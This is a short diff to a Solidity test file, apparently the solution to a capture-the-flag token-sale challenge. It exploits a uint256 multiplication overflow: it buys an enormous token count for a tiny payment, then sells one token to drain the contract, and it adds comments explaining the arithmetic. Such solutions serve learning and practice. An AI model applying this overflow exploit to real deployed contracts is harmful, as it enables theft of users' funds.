@@ -18,19 +18,13 @@ contract TokenSaleTest is Test {
     }
 
     function test_solution() public {
-        console.log(address(tokenSale).balance);
+        //uint256(-1) / PRICE_PER_TOKEN + 1
         uint256 tokenNumOverflow = 115792089237316195423570985008687907853269984665640564039458;
+        //tokenNumOverflow * PRICE_PER_TOKEN - 2^256 (uint256 overflow)
         uint256 Wei = 415992086870360064;
         //make it overflow
         tokenSale.buy{value: Wei}(tokenNumOverflow);
-
-        console.log(tokenSale.balanceOf(challenger));
-        console.log(address(tokenSale).balance);
-
         tokenSale.sell(1);
-        console.log(tokenSale.balanceOf(challenger));
-        console.log(address(tokenSale).balance);
-
         assertEq(tokenSale.isComplete(), true);
     }
 }
